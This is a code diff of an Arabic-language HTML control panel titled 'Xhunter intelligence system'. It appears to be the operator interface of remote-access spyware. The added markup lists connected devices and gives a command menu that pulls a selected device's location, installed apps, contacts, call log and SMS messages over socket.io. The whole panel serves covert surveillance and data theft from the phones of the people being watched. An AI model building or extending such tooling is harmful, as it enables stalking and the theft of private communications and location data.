@@ -3,19 +3,59 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة تحكم الأجهزة</title>
+<title>لوحة تحكم Xhunter</title>
 <link rel="stylesheet" href="style.css">
 <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
-<h1>لوحة التحكم</h1>
 
-<h2>الأجهزة المتصلة</h2>
-<div id="devices"></div>
+<header>
+  <h1>نظام استخبارات <span>Xhunter</span></h1>
+</header>
 
-<h2>سجل الأحداث</h2>
-<div id="logs"></div>
+<nav class="topbar">
+  <button data-tab="devices" class="tab active">الأجهزة</button>
+  <button data-tab="data" class="tab">بيانات الجهاز</button>
+  <button data-tab="logs" class="tab">السجل</button>
+  <button data-tab="commands" class="tab">الأوامر</button>
+</nav>
 
-<script src="admin.js"></script>
+<main>
+  <!-- تبويب الأجهزة -->
+  <section id="tab-devices" class="panel active">
+    <h2>الأجهزة المتصلة</h2>
+    <ul id="deviceList"></ul>
+  </section>
+
+  <!-- تبويب بيانات الجهاز -->
+  <section id="tab-data" class="panel">
+    <h2>بيانات الجهاز المحدد</h2>
+    <pre id="deviceInfo">اختر جهازاً من تبويب "الأجهزة"</pre>
+  </section>
+
+  <!-- تبويب السجل -->
+  <section id="tab-logs" class="panel">
+    <h2>السجل</h2>
+    <ul id="logList"></ul>
+  </section>
+
+  <!-- تبويب الأوامر -->
+  <section id="tab-commands" class="panel">
+    <h2>إصدار أوامر</h2>
+    <select id="deviceSelect"></select>
+    <select id="commandAction">
+      <option value="getLocation">طلب الموقع</option>
+      <option value="getInstalledApps">التطبيقات</option>
+      <option value="getContacts">جهات الاتصال</option>
+      <option value="getCallLog">سجل المكالمات</option>
+      <option value="getSMS">الرسائل</option>
+      <option value="getExtraData">بيانات إضافية</option>
+    </select>
+    <input id="commandData" placeholder='بيانات JSON (اختياري)'>
+    <button id="sendCommand">إرسال</button>
+  </section>
+</main>
+
+<script src="app.js"></script>
 </body>
 </html>
